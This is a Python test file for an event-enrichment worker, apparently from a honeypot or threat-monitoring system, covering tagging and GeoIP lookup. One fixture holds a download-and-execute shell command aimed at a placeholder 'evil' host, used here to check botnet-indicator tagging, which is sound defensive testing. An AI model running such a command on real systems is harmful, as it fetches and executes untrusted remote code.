"""Tests for event enrichment / tagging."""

from worker.enrichment import enrich_event


def test_download_command_tagged_as_botnet():
    event = {"command": "wget http://evil/x.sh; chmod +x x.sh; ./x.sh", "tags": []}
    enrich_event(event)
    assert "download" in event["tags"]
    assert "execution" in event["tags"]
    assert "botnet_indicator" in event["tags"]


def test_protocol_added_as_tag():
    event = {"protocol": "ssh", "source_ip": "203.0.113.5", "tags": []}
    enrich_event(event)
    assert "ssh" in event["tags"]


def test_private_ip_tagged():
    event = {"source_ip": "10.0.0.1", "tags": []}
    enrich_event(event)
    assert "private_ip" in event["tags"]


def test_invalid_ip_tagged():
    event = {"source_ip": "not-an-ip", "tags": []}
    enrich_event(event)
    assert "invalid_ip" in event["tags"]


def test_payload_url_tagged():
    event = {"payload_url": "http://evil/x", "tags": []}
    enrich_event(event)
    assert "payload" in event["tags"]


def test_tags_deduplicated():
    event = {"protocol": "ssh", "tags": ["ssh", "ssh"]}
    enrich_event(event)
    assert event["tags"].count("ssh") == 1


def test_benign_command_no_botnet_tag():
    event = {"command": "ls -la", "tags": []}
    enrich_event(event)
    assert "botnet_indicator" not in event["tags"]


class _FakeGeoIP:
    """Stand-in for worker.geoip.GeoIP used to exercise the geo branch."""

    def lookup(self, ip):
        if ip == "203.0.113.5":
            return "SG", "AS64512 Example ASN"
        return None, None


def test_geoip_enrichment_populates_fields():
    event = {"source_ip": "203.0.113.5", "tags": []}
    enrich_event(event, _FakeGeoIP())
    assert event["geo_country"] == "SG"
    assert event["geo_asn"] == "AS64512 Example ASN"
    assert "SG" in event["tags"]


def test_geoip_enrichment_no_match_is_noop():
    event = {"source_ip": "10.0.0.1", "tags": []}
    enrich_event(event, _FakeGeoIP())
    assert "geo_country" not in event
    assert "geo_asn" not in event
